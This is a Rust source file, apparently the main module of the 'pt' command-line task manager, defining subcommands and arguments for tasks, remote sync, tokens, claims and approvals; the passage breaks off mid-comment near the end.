//! `pt` — pTask command-line interface.
//!
//! v0.1.0 covers parity with the legacy Python `cli.py`:
//!   pt add <title> [-p PRIORITY] [-d DESCRIPTION] [--deadline ISO] [--reason TEXT]
//!   pt list        [-s STATUS]   [-p PRIORITY]    [-n LIMIT]       [-v]
//!   pt done <query>
//!
//! Later phases added `show`, `dismiss`, `rm`, `reopen`, richer `edit`,
//! `serve`, `bot`, `tui`, and the `remote` mutation/read verbs.

use anyhow::{Context, Result};
use clap::{Parser, Subcommand};
use ptask_core::{Db, dag, priority, pt_id, quickadd, tasks, views};
use std::io::IsTerminal;
use std::path::{Path, PathBuf};

mod approvals;
mod goals;
mod remote;
mod ui;

#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
enum ColorChoice {
    Auto,
    Always,
    Never,
}

#[derive(Parser, Debug)]
#[command(
    name = "pt",
    version = ptask_core::VERSION,
    about = "Sovereign task manager for PureTensor",
    long_about = None,
)]
struct Cli {
    /// Override the SQLite path (default: $PTASK_DB or ~/puretensor-tasks/tasks.db).
    #[arg(long, env = "PTASK_DB", global = true)]
    db: Option<String>,

    /// Emit machine-readable JSON instead of human text (task-facing verbs).
    #[arg(long, global = true)]
    json: bool,

    /// Idempotency key recorded with the mutation's event — a retried
    /// command with the same key returns ok without re-applying.
    #[arg(long = "idempotency-key", global = true)]
    idempotency_key: Option<String>,

    /// Colour: auto (TTY only; honours NO_COLOR and PT_COLOR=always|never), always, or never.
    #[arg(long = "color", global = true, value_enum, default_value_t = ColorChoice::Auto)]
    color: ColorChoice,

    /// Plain output — shorthand for `--color never`.
    #[arg(long = "no-color", global = true)]
    no_color: bool,

    #[command(subcommand)]
    command: Option<Command>,
}

#[derive(Subcommand, Debug)]
enum Command {
    /// Create a new task.
    Add(AddArgs),
    /// List tasks.
    #[command(alias = "ls")]
    List(ListArgs),
    /// Mark a task done (by PT-N or title substring).
    Done(DoneArgs),
    /// Promote/demote a task's priority (critical|urgent|high|normal|low or 1..=5).
    #[command(alias = "pri")]
    Priority(PriorityArgs),
    /// Edit task fields.
    #[command(alias = "update")]
    Edit(EditArgs),
    /// Reopen a completed/dismissed task (status → pending).
    Reopen(ReopenArgs),
    /// Show one task's full row + side-table detail.
    Show(ShowArgs),
    /// Markdown worker brief: title, why-chain, blockers.
    Context(ContextArgs),
    /// Dismiss a task (soft close, status → dismissed; reversible via reopen).
    Dismiss(DismissArgs),
    /// Append a note to a task: findings, evidence, a handover. Attributed
    /// and append-only; `pt show` and `pt context` carry the trail.
    #[command(alias = "annotate")]
    Note(NoteArgs),
    /// Delete a task permanently (hard delete + tombstone).
    Rm(RmArgs),
    /// Acceptance criteria (definition of done): a task with an unchecked
    /// criterion cannot be closed.
    #[command(subcommand, alias = "ac")]
    Criteria(CriteriaCommand),
    /// Likely duplicates: of one task, or pairs among all open tasks
    /// (lexical title similarity; read-only).
    #[command(alias = "dups")]
    Dupes(DupesArgs),
    /// Merge a duplicate into the task it duplicates: dismiss it as
    /// `duplicate_of`, move its dependents, prerequisites, labels,
    /// recurrence, goal, provenance and subtasks, keep the higher priority.
    Merge(MergeArgs),
    /// Show ready-to-start tasks (all dependencies done).
    Next(NextArgs),
    /// Advisory day plan: fit the ready queue into calendar free/busy (dry-run
    /// unless --write). Reads free slots via gcalendar.py; --write adds
    /// tentative events to our own calendar only.
    Plan(PlanArgs),
    /// Manage saved views.
    #[command(subcommand)]
    View(ViewCommand),
    /// Launch the terminal UI (ratatui).
    Tui,
    /// Run the HTTP server (sync API, capture, webhooks, metrics).
    Serve(ServeArgs),
    /// Run the Telegram bot (Bot API long-poll).
    Bot,
    /// Serve the MCP server over stdio (agent-native tool surface).
    Mcp,
    /// Session-priming digest: recent done/dismissed/created + ready queue.
    Digest(DigestArgs),
    /// Export tasks/links/labels as JSONL (optionally git-commit the export).
    Export(ExportArgs),
    /// Print the operator-gated delegation command for a task (skeleton).
    Delegate(DelegateArgs),
    /// Print a Linear-style branch name for a task.
    Branch(BranchArgs),
    /// Run the native Rust distillation pipeline.
    Distill(DistillArgs),
    /// Run one accountability cycle (escalation + Telegram/email).
    #[command(subcommand)]
    Accountability(AccountabilityCommand),
    /// Recompute composite priority scores for all active tasks.
    #[command(subcommand)]
    Scoring(ScoringCommand),
    /// Talk to a remote canonical `pt serve` (no local DB).
    #[command(subcommand)]
    Remote(RemoteCommand),
    /// Promote an investigation to implementation: kind scout → ship on the
    /// SAME row (never close + reopen a duplicate).
    Promote(StartArgs),
    /// Set a task's kind (scout|ship) and optional deliverable.
    Kind(KindArgs),
    /// Mark a task in progress (you're actively working it).
    Start(StartArgs),
    /// Claim a task for work (todo/backlog/triage → in_progress, owned by
    /// you), optionally with a lease that `pt heartbeat` keeps alive.
    Claim(ClaimArgs),
    /// Renew your claim's lease; fails (exit 1) when the claim is no longer
    /// yours, which means stop working on it. Requires `--claim` with the
    /// token `pt claim` / `pt start` returned.
    Heartbeat(HeartbeatArgs),
    /// Hand a claimed task back (in_progress → todo) without closing it.
    /// `--claim TOKEN` names the instance; without a token, `--force`.
    Release(ReleaseArgs),
    /// Return tasks whose claim lease ran out to todo (dry run unless --apply).
    Reclaim(ReclaimArgs),
    /// Snooze a task until a date — it leaves `pt next` and reminders,
    /// then wakes to todo automatically.
    Snooze(SnoozeArgs),
    /// Reap stale machine-generated tasks (incident >7d idle, distilled
    /// >30d idle) — soft-dismiss, reversible via `pt reopen`.
    Reap(ReapArgs),
    /// Manage dependency edges: PT-A depends on PT-B.
    Depend(DependArgs),
    /// Interactive review sweep: stale, snoozed-expired, and triage items.
    Review(ReviewArgs),
    /// Full-text search over titles + descriptions (FTS5).
    Search(SearchArgs),
    /// Explain a task's composite score: components, weights, rank.
    Why(WhyArgs),
    /// Apply one action to every task matching a filter DSL expression.
    Bulk(BulkArgs),
    /// Show a task's attributed event history (who did what, via which surface).
    Log(LogArgs),
    /// Who opened and who closed work over a window: created, done,
    /// dismissed, reopened and net per actor, from the journal.
    Flux(FluxArgs),
    /// Reverse your own most recent undoable mutation (done/dismiss/create).
    ///
    /// done/dismiss → reopen (a merge is fully reversed); create → delete.
    /// Only the caller's own events
    /// ($PTASK_ACTOR) are candidates. Undoing a create deletes the task
    /// permanently, so it asks first and, without a TTY, refuses unless --yes.
    Undo(UndoArgs),
    /// Manage named scoped API tokens (create/list/revoke).
    #[command(subcommand)]
    Token(TokenCommand),
    /// Approval inbox: agents request, the operator decides, executors consume.
    #[command(subcommand)]
    Approval(approvals::ApprovalCommand),
    /// Goal tree: mission ancestry for tasks.
    #[command(subcommand)]
    Goal(goals::GoalCommand),
    /// Approve a pending approval request (operator only).
    Approve(approvals::DecideArgs),
    /// Reject a pending approval request (operator only).
    Reject(approvals::DecideArgs),
    /// One-shot backfill PT-N for any tasks lacking one.
    Backfill,
    /// Generate the `pt(1)` manpage to stdout.
    GenManpage,
    /// Generate shell completions (bash/zsh/fish) to stdout.
    GenCompletions(GenCompletionsArgs),
}

#[derive(Subcommand, Debug)]
enum AccountabilityCommand {
    /// Run the state machine + dispatch once.
    Run(AccountabilityRunArgs),
}

#[derive(clap::Args, Debug)]
struct DigestArgs {
    /// Lookback window in days.
    #[arg(long, default_value_t = 7)]
    days: i64,
}

#[derive(clap::Args, Debug)]
struct ExportArgs {
    /// Output directory (default ~/puretensor-tasks/export).
    #[arg(long)]
    out: Option<std::path::PathBuf>,
    /// Commit the export in-place (init a repo on first run).
    #[arg(long)]
    git: bool,
}

#[derive(clap::Args, Debug)]
struct DelegateArgs {
    /// Task handle (PT-N / uuid / title substring).
    id: String,
}

#[derive(clap::Args, Debug)]
struct AccountabilityRunArgs {
    /// Don't actually send anything; log what would have been dispatched.
    #[arg(long = "dry-run")]
    dry_run: bool,
}

#[derive(clap::Args, Debug)]
struct StartArgs {
    /// PT-N, bare integer, or title substring.
    query: String,
}

#[derive(clap::Args, Debug)]
struct ClaimArgs {
    /// PT-N, bare integer, uuid, or title substring (open tasks).
    query: String,
    /// Lease length (30m, 2h, 1d; max 1d). Without one the claim never
    /// expires on its own.
    #[arg(long)]
    lease: Option<String>,
}

#[derive(clap::Args, Debug)]
struct HeartbeatArgs {
    /// PT-N, bare integer, uuid, or title substring.
    query: String,
    /// Claim instance token returned by `pt claim` or `pt start`.
    #[arg(long = "claim", value_name = "TOKEN")]
    claim: String,
    /// New lease length from now (30m, 2h, 1d; max 1d).
    #[arg(long, default_value = "30m")]
    lease: String,
}

#[derive(clap::Args, Debug)]
struct ReleaseArgs {
    /// PT-N, bare integer, uuid, or title substring.
    query: String,
    /// Claim instance token returned by `pt claim` or `pt start`.
    /// Without one, `--force` is required (and so is releasing an unowned
    /// in-progress task).
    #[arg(long = "claim", value_name = "TOKEN")]
    claim: Option<String>,
    /// Release a claim another actor holds, an unowned in-progress task,
    /// or a claim whose token you do not have (the operator's override).
    #[arg(long)]
    force: bool,
    /// Why it is being handed back, journaled with the release.
    #[arg(short = 'm', long = "reason")]
    reason: Option<String>,
}

#[derive(clap::Args, Debug)]
struct ReclaimArgs {
    /// Return the expired claims to todo (default: list them only).
    #[arg(long)]
    apply: bool,
}

#[derive(clap::Args, Debug)]
struct SnoozeArgs {
    /// PT-N, bare integer, or title substring.
    query: String,
    /// Wake date/time: ISO or natural ("tomorrow 9am", "next monday").
    until: Vec<String>,
}

#[derive(clap::Args, Debug)]
struct ReapArgs {
    /// List what would be dismissed without touching anything.
    #[arg(long = "dry-run")]
    dry_run: bool,
    /// Emit the report as JSON (machine callers / timers).
    #[arg(long = "json")]
    json: bool,
}

#[derive(clap::Args, Debug)]
struct DependArgs {
    /// The dependent task (cannot be closed until --on is done or dismissed).
    query: String,
    /// The prerequisite task.
    #[arg(long = "on")]
    on: Option<String>,
    /// Remove the edge instead of adding it.
    #[arg(long = "clear", requires = "on")]
    clear: bool,
}

#[derive(clap::Args, Debug)]
struct ReviewArgs {
    /// Days of inactivity that makes a task "stale".
    #[arg(long = "stale-days", default_value_t = 14,
          value_parser = clap::value_parser!(i64).range(0..))]
    stale_days: i64,
}

#[derive(clap::Args, Debug)]
struct WhyArgs {
    /// PT-N, bare integer, or title substring.
    query: String,
}

#[derive(clap::Args, Debug)]
struct SearchArgs {
    /// Words to find (FTS5): every word must match; punctuation and
    /// AND/OR/NOT are plain text; a trailing * matches a prefix.
    query: Vec<String>,
    #[arg(short = 'n', long = "limit", default_value_t = 20)]
    limit: usize,
}

#[derive(clap::Args, Debug)]
struct BulkArgs {
    /// Filter DSL selecting the tasks (same grammar as `pt list`).
    filter: String,
    /// Set priority on every match.
    #[arg(long = "set-priority")]
    set_priority: Option<String>,
    /// Mark every match done.
    #[arg(long = "done", conflicts_with = "set_priority")]
    done: bool,
    /// Dismiss every match.
    #[arg(long = "dismiss", conflicts_with_all = ["set_priority", "done"])]
    dismiss: bool,
    /// Note journaled with each completion or dismissal (--done / --dismiss).
    #[arg(short = 'm', long = "note", conflicts_with = "set_priority")]
    note: Option<String>,
    /// Preview without applying.
    #[arg(long = "dry-run")]
    dry_run: bool,
}

#[derive(clap::Args, Debug)]
struct FluxArgs {
    /// Window: 30m, 6h, 24h, 7d, 2w (max 90d).
    #[arg(long, default_value = "24h")]
    since: String,
}

#[derive(clap::Args, Debug)]
struct LogArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    /// Max events to show (newest first).
    #[arg(short = 'n', long = "limit", default_value_t = 20)]
    limit: usize,
}

#[derive(Subcommand, Debug)]
enum TokenCommand {
    /// Mint a token for a client. Prints the plain token ONCE — store it
    /// with the consumer; only its hash is kept.
    Create(TokenCreateArgs),
    /// List all tokens (client, scope, created/last-used/revoked).
    List,
    /// Revoke every active token for a client id.
    Revoke(TokenRevokeArgs),
}

#[derive(clap::Args, Debug)]
struct TokenCreateArgs {
    /// Stable client identity: hal, puresentinel, nexus, dashboard, shell-<host>…
    client_id: String,
    /// Scope: read | capture | write | admin (each implies the previous).
    #[arg(long = "scope", default_value = "write")]
    scope: String,
}

#[derive(clap::Args, Debug)]
struct TokenRevokeArgs {
    client_id: String,
}

#[derive(Subcommand, Debug)]
enum ScoringCommand {
    /// Recompute the four score_* columns + priority_score for every
    /// task with status NOT IN ('done', 'dismissed').
    Run(ScoringRunArgs),
}

#[derive(Subcommand, Debug)]
enum RemoteCommand {
    /// `pt remote add "..."` — create a task on the canonical host
    /// without opening a local DB. Uses PTASK_SYNC_URL (default
    /// http://127.0.0.1:9501).
    Add(RemoteAddArgs),
    /// `pt remote list` — fetch the live task set from the canonical host.
    #[command(alias = "ls")]
    List(RemoteListArgs),
    /// `pt remote done <query>` — mark a task done by PT-N or title substring.
    Done(RemoteCloseArgs),
    /// `pt remote priority <query> <level>` — set priority on the canonical host.
    #[command(alias = "pri")]
    Priority(RemotePriorityArgs),
    /// `pt remote edit <query> --deadline <iso> | --clear-deadline`.
    #[command(alias = "update")]
    Edit(RemoteEditArgs),
    /// `pt remote reopen <query>` — flip a done/dismissed task back to pending.
    Reopen(RemoteReopenArgs),
    /// `pt remote show <query>` — print one task's full row + detail (read-only).
    Show(RemoteShowArgs),
    /// `pt remote next [-n N]` — DAG-ready tasks from the canonical host.
    Next(RemoteNextArgs),
    /// `pt remote dismiss <query>` — soft-close a task (reversible via reopen).
    Dismiss(RemoteDismissArgs),
    /// `pt remote note <query> <text…>` — append a note on the canonical host.
    Note(RemoteNoteArgs),
    /// `pt remote start <query>` — mark in progress on the canonical host.
    Start(RemoteDoneArgs),
    /// `pt remote snooze <query> <until>` — snooze on the canonical host.
    Snooze(RemoteSnoozeArgs),
    /// `pt remote depend <query> --on <target> [--clear]`.
    Depend(RemoteDependArgs),
    /// `pt remote rm <query>` — permanent delete (tombstoned). Asks first;
    /// refuses without --yes when there is no TTY to ask on.
    Rm(RemoteRmArgs),
    /// `pt remote version` — compare this client's version against the
    /// canonical server's `GET /version`. Exits non-zero on skew.
    Version(RemoteVersionArgs),
}

#[derive(clap::Args, Debug)]
struct RemoteSnoozeArgs {
    query: String,
    /// Wake date/time (ISO or natural language, parsed locally).
    until: Vec<String>,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteDependArgs {
    query: String,
    #[arg(long = "on")]
    on: String,
    #[arg(long = "clear")]
    clear: bool,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteVersionArgs {
    /// Override the canonical endpoint.
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteAddArgs {
    /// Quick-add text. Same grammar as local `pt add`.
    text: String,
    /// Override the canonical endpoint.
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteListArgs {
    #[arg(short = 's', long = "status", default_value = "pending")]
    status: String,
    /// Filter DSL evaluated SERVER-side (GET /list).
    #[arg(short = 'f', long = "filter")]
    filter: Option<String>,
    #[arg(short = 'p', long = "priority")]
    priority: Option<String>,
    #[arg(short = 'n', long = "limit", default_value_t = 20)]
    limit: usize,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteDoneArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteCloseArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    /// Closure evidence journaled with the completion.
    #[arg(short = 'm', long = "note")]
    note: Option<String>,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteNoteArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring (open tasks;
    /// a done or dismissed task by PT-N).
    query: String,
    /// The note; words are joined with spaces. `-` reads it from stdin.
    #[arg(required = true)]
    text: Vec<String>,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteRmArgs {
    /// PT-N, bare integer, uuid, or a title substring (open tasks only).
    query: String,
    /// Skip the confirmation prompt.
    #[arg(short = 'y', long = "yes")]
    yes: bool,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemotePriorityArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    /// New level: low|normal|high|urgent|critical or 1..=5.
    level: String,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteEditArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    /// Set deadline to an ISO date/datetime, e.g. 2026-06-30.
    #[arg(long = "deadline")]
    deadline: Option<String>,
    /// Clear the deadline.
    #[arg(long = "clear-deadline")]
    clear_deadline: bool,
    /// Replace the title.
    #[arg(long = "title")]
    title: Option<String>,
    /// Replace the description.
    #[arg(long = "desc")]
    desc: Option<String>,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteNextArgs {
    #[arg(short = 'n', long = "limit", default_value_t = 20)]
    limit: usize,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteReopenArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteDismissArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    /// Why it is not being done, journaled with the dismissal.
    #[arg(short = 'm', long = "note")]
    note: Option<String>,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct RemoteShowArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    #[arg(long = "url", env = "PTASK_SYNC_URL")]
    url: Option<String>,
}

#[derive(clap::Args, Debug)]
struct ScoringRunArgs {
    /// Compute and log scores but don't write them back to the DB.
    #[arg(long = "dry-run")]
    dry_run: bool,
    /// Use the retired v1 formula (comparison escape hatch).
    #[arg(long = "v1")]
    v1: bool,
    /// Print an old-vs-new top-20 rank diff (implies --dry-run semantics
    /// for the comparison pass; final write still follows the chosen mode).
    #[arg(long = "diff")]
    diff: bool,
}

#[derive(clap::Args, Debug)]
struct DistillArgs {
    /// Max raw_items consumed per native run.
    #[arg(long = "batch", default_value_t = 200)]
    batch: usize,
}

#[derive(clap::Args, Debug)]
struct BranchArgs {
    /// PT-N (or bare integer, or title substring).
    query: String,
}

#[derive(clap::Args, Debug)]
struct ServeArgs {
    /// Bind address. Default 127.0.0.1:9501 (leaves :9500 for legacy
    /// Python FastAPI during the parallel-ops window).
    #[arg(long = "bind")]
    bind: Option<String>,
}

#[derive(Subcommand, Debug)]
enum ViewCommand {
    /// Save a filter DSL string under a name.
    Save { name: String, filter: String },
    /// List saved views.
    #[command(alias = "ls")]
    List,
    /// Run a saved view's filter and print matching tasks.
    Show {
        name: String,
        /// Override row limit.
        #[arg(short = 'n', long = "limit", default_value_t = 20)]
        limit: usize,
        /// Filter by status (or `all`), as in `pt list`.
        #[arg(short = 's', long = "status", default_value = "pending")]
        status: String,
    },
    /// Delete a saved view.
    Rm { name: String },
}

#[derive(clap::Args, Debug)]
struct NextArgs {
    /// Max ready tasks to show.
    #[arg(short = 'n', long = "limit", default_value_t = 20)]
    limit: usize,
}

#[derive(clap::Args, Debug)]
struct PlanArgs {
    /// gcalendar.py account (free/busy source).
    #[arg(long, default_value = "ops")]
    account: String,
    /// Planning horizon in days.
    #[arg(long, default_value_t = 1)]
    days: i64,
    /// Working hours HH:MM-HH:MM.
    #[arg(long, default_value = "09:00-18:00")]
    work: String,
    /// Timezone.
    #[arg(long, default_value = "Europe/London")]
    tz: String,
    /// Calendar id.
    #[arg(long, default_value = "primary")]
    calendar: String,
    /// Default minutes for a task with no duration_min.
    #[arg(long, default_value_t = 30)]
    slot_default: i64,
    /// Max ready tasks to consider.
    #[arg(short = 'n', long = "limit", default_value_t = 20)]
    limit: usize,
    /// Create tentative calendar events for the plan (our calendar only).
    #[arg(long)]
    write: bool,
    /// Path to gcalendar.py.
    #[arg(long, env = "PTASK_GCAL")]
    gcal: Option<PathBuf>,
}

#[derive(clap::Args)]
struct AddArgs {
    /// Task title (parsed as quick-add unless --raw is set).
    /// Inline tokens: @label, #project, p1..p5, ~30m/~2h/~1d, !HH:MM,
    /// //description (rest of string), a future YYYY-MM-DD deadline,
    /// `every …` recurrence. Other date prose stays title text; use --deadline.
    title: String,
    /// Priority override (low|normal|high|urgent|critical or 1..=5).
    /// If omitted, uses quick-add priority or "normal".
    #[arg(short = 'p', long = "priority")]
    priority: Option<String>,
    /// Description override.
    #[arg(short = 'd', long = "description")]
    description: Option<String>,
    /// Deadline override (ISO date, e.g. 2026-05-20).
    #[arg(long = "deadline")]
    deadline: Option<String>,
    /// Why this task was created — stored as ai_reasoning.
    #[arg(long = "reason")]
    reason: Option<String>,
    /// Disable quick-add parsing — treat the title literally.
    #[arg(long = "raw")]
    raw: bool,
    /// Task shape: scout (investigation) or ship (implementation, default).
    #[arg(long = "kind")]
    kind: Option<String>,
    /// What finishing it produces: report | pr | none.
    /// Defaults to the kind's deliverable when --kind is given.
    #[arg(long = "deliverable")]
    deliverable: Option<String>,
    /// Refuse to create the task when a near-certain duplicate exists (an
    /// open task, or one closed in the last 14 days, scoring at least 0.75
    /// with the same identifier-like words); the candidates are listed and
    /// the command exits 1.
    #[arg(long)]
    unique: bool,
    /// An acceptance criterion (repeatable): the task closes only once each
    /// is checked with `pt criteria check`.
    #[arg(long = "ac", value_name = "CRITERION")]
    acceptance: Vec<String>,
}

/// Debug omits empty/default fields added after a release (`unique: false`,
/// an empty `acceptance` list) so a keyed `pt add` fingerprints the same as
/// it did before those flags existed.
impl std::fmt::Debug for AddArgs {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let mut s = f.debug_struct("AddArgs");
        s.field("title", &self.title)
            .field("priority", &self.priority)
            .field("description", &self.description)
            .field("deadline", &self.deadline)
            .field("reason", &self.reason)
            .field("raw", &self.raw)
            .field("kind", &self.kind)
            .field("deliverable", &self.deliverable);
        if self.unique {
            s.field("unique", &self.unique);
        }
        if !self.acceptance.is_empty() {
            s.field("acceptance", &self.acceptance);
        }
        s.finish()
    }
}

#[derive(Subcommand, Debug)]
enum CriteriaCommand {
    /// List a task's acceptance criteria and their state.
    Ls { query: String },
    /// Add one criterion (the words joined).
    Add {
        query: String,
        #[arg(required = true)]
        text: Vec<String>,
    },
    /// Check criterion N, optionally with the evidence that it holds.
    Check {
        query: String,
        n: i64,
        #[arg(short = 'm', long = "evidence")]
        evidence: Option<String>,
    },
    /// Uncheck criterion N.
    Uncheck { query: String, n: i64 },
    /// Remove criterion N from the definition of done.
    Rm { query: String, n: i64 },
}

#[derive(clap::Args, Debug)]
struct DupesArgs {
    /// A task to find duplicates of; omit to list likely duplicate pairs
    /// among all open tasks.
    query: Option<String>,
    /// Similarity threshold, 0..=1 (Dice over normalised title words).
    #[arg(long, default_value_t = ptask_core::dupes::DEFAULT_THRESHOLD)]
    threshold: f64,
    /// Max rows.
    #[arg(short = 'n', long = "limit", default_value_t = 20)]
    limit: usize,
}

#[derive(clap::Args, Debug)]
struct MergeArgs {
    /// The duplicate (open): PT-N, bare integer, uuid, or title substring.
    duplicate: String,
    /// The task it duplicates (open, or done with no open dependents on
    /// the duplicate). Dismissed targets are refused.
    #[arg(long = "into")]
    into: String,
    /// Why, journaled on both tasks.
    #[arg(short = 'm', long = "reason")]
    reason: Option<String>,
}

#[derive(clap::Args, Debug)]
struct KindArgs {
    /// PT-N, bare integer, or title substring.
    query: String,
    /// scout | ship.
    kind: String,
    /// report | pr | none. Left unchanged when omitted.
    #[arg(long = "deliverable")]
    deliverable: Option<String>,
}

#[derive(clap::Args, Debug)]
struct ListArgs {
    /// Optional Todoist-style filter DSL.
    /// Examples: "today & p1", "(today | overdue) & #fleet",
    /// "@waiting & no date", "due before: next friday & !recurring",
    /// "search: ceph & @ops".
    filter: Option<String>,
    /// Filter by status (or `all`).
    #[arg(short = 's', long = "status", default_value = "pending")]
    status: String,
    /// Filter by priority.
    #[arg(short = 'p', long = "priority")]
    priority: Option<String>,
    /// Max rows.
    #[arg(short = 'n', long = "limit", default_value_t = 20)]
    limit: usize,
    /// Show description and UUID.
    #[arg(short = 'v', long = "verbose")]
    verbose: bool,
    /// Order: severity (default, critical first), score (composite ranking),
    /// or created (newest first).
    #[arg(long = "sort", default_value = "severity")]
    sort: String,
}

#[derive(clap::Args, Debug)]
struct DoneArgs {
    /// One or more tasks: PT-N (e.g. PT-42), bare integer, or title substring.
    #[arg(required = true)]
    queries: Vec<String>,
    /// Closure evidence journaled with the completion (what was done, how
    /// it was verified). With several tasks, each gets the same note.
    #[arg(short = 'm', long = "note")]
    note: Option<String>,
    /// After closing, claim the next ready task (`pt next` order) for
    /// $PTASK_ACTOR: close and continue in one command. Same take as
    /// `pt claim`: an owner, an optional `--lease`, and a claim_token.
    #[arg(long = "claim-next")]
    claim_next: bool,
    /// Lease for `--claim-next` (`30m`, `2h`, `1d`; max 1d). Without one
    /// the claim never expires on its own.
    #[arg(long, requires = "claim_next")]
    lease: Option<String>,
}

#[derive(clap::Args, Debug)]
struct PriorityArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    /// New level: low|normal|high|urgent|critical or 1..=5.
    level: String,
}

#[derive(clap::Args, Debug)]
struct EditArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    /// Set deadline to an ISO date/datetime, e.g. 2026-06-16.
    #[arg(long = "deadline")]
    deadline: Option<String>,
    /// Clear the deadline.
    #[arg(long = "clear-deadline")]
    clear_deadline: bool,
    /// Replace the title.
    #[arg(long = "title")]
    title: Option<String>,
    /// Replace the description.
    #[arg(long = "desc")]
    desc: Option<String>,
    /// Add a label (repeatable), e.g. --label domain:mgmt.
    #[arg(long = "label")]
    label: Vec<String>,
    /// Remove a label (repeatable).
    #[arg(long = "unlabel")]
    unlabel: Vec<String>,
}

#[derive(clap::Args, Debug)]
struct ReopenArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
}

#[derive(clap::Args, Debug)]
struct ShowArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
}

#[derive(clap::Args, Debug)]
struct ContextArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
}

#[derive(clap::Args, Debug)]
struct DismissArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    /// Why it is not being done, journaled with the dismissal.
    #[arg(short = 'm', long = "note")]
    note: Option<String>,
}

#[derive(clap::Args, Debug)]
struct NoteArgs {
    /// PT-N (e.g. PT-42), bare integer (42), task uuid, or title substring
    /// (open tasks; a done or dismissed task by PT-N or uuid).
    query: String,
    /// The note; words are joined with spaces. `-` reads it from stdin.
    #[arg(required = true)]
    text: Vec<String>,
}

#[derive(clap::Args, Debug)]
struct RmArgs {
    /// PT-N (e.g. PT-42), bare integer (42), or title substring.
    query: String,
    /// Skip the confirmation prompt.
    #[arg(short = 'y', long = "yes")]
    yes: bool,
}

#[derive(clap::Args, Debug)]
struct UndoArgs {
    /// Skip the confirmation when the undo would delete a task.
    #[arg(short = 'y', long = "yes")]
    yes: bool,
}

#[derive(clap::Args, Debug)]
struct GenCompletionsArgs {
    /// Target shell.
    #[arg(value_enum)]
    shell: ShellChoice,
}

#[derive(clap::ValueEnum, Clone, Copy, Debug)]
enum ShellChoice {
    Bash,
    Zsh,
    Fish,
}

/// Process-wide CLI output/attribution overrides, set once at the
/// entrypoint from the parsed global flags. A `pt` process executes exactly
/// one command, so this is entrypoint-time config, not ambient state.
static CLI_JSON: std::sync::OnceLock<bool> = std::sync::OnceLock::new();
static CLI_IDEMPOTENCY: std::sync::OnceLock<Option<String>> = std::sync::OnceLock::new();
static CLI_COMMAND: std::sync::OnceLock<ptask_core::event_log::CommandFingerprint> =
    std::sync::OnceLock::new();
/// Stdin consumed by `pt note -` / `pt remote note -`, so a keyed fingerprint
/// can hash the payload once and `note_text` does not re-read EOF.
static STDIN_NOTE: std::sync::OnceLock<String> = std::sync::OnceLock::new();

fn set_cli_globals(json: bool, idempotency_key: Option<String>) {
    let _ = CLI_JSON.set(json);
    let _ = CLI_IDEMPOTENCY.set(idempotency_key);
}

fn json_mode() -> bool {
    *CLI_JSON.get().unwrap_or(&false)
}

/// Print a value as pretty JSON when --json is set; otherwise run the
/// human-text closure.
/// Pretty JSON that is safe on a terminal: serde_json escapes C0 controls
/// only, so DEL, C1 and bidi/invisible characters are re-escaped as \uXXXX
/// (still valid JSON with the same value). Every JSON printer uses this.
pub(crate) fn json_pretty<T: serde::Serialize + ?Sized>(value: &T) -> Result<String> {
    let raw = serde_json::to_string_pretty(value)?;
    Ok(ptask_core::text::json_terminal_safe(&raw).into_owned())
}

pub(crate) fn print_json<T: serde::Serialize + ?Sized>(value: &T) -> Result<()> {
    println!("{}", json_pretty(value)?);
    Ok(())
}

fn emit<T: serde::Serialize>(value: &T, text: impl FnOnce()) -> Result<()> {
    if json_mode() {
        print_json(value)?;
    } else {
        text();
    }
    Ok(())
}

/// Attribution for this CLI invocation: actor = $PTASK_ACTOR (the dashboard
